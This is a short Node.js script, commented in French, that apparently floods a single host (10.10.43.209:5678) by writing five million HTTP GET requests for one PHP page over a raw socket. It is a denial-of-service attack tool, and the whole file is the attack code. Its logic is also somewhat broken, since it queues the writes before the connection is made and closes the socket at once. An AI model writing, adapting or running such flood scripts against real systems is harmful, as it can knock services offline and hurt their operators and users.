const net = require('net');

const target_host = "10.10.43.209";
const target_port = 5678;

// Créer une connexion socket
const client = new net.Socket();

// Connecter le client
client.connect(target_port, target_host, function() {
  console.log('Connecté');
});

// Envoyer des requêtes GET
for (let i = 0; i < 5; i++) {
  for (let j = 0; j < 1000000; j++) {
    const request = Buffer.from(`GET http://10.10.43.209:5678/0.08/index.php HTTP/1.1\r\nHost: ${target_host}\r\n\r\n`);
    client.write(request);
  }
}

// Fermer la connexion
client.destroy();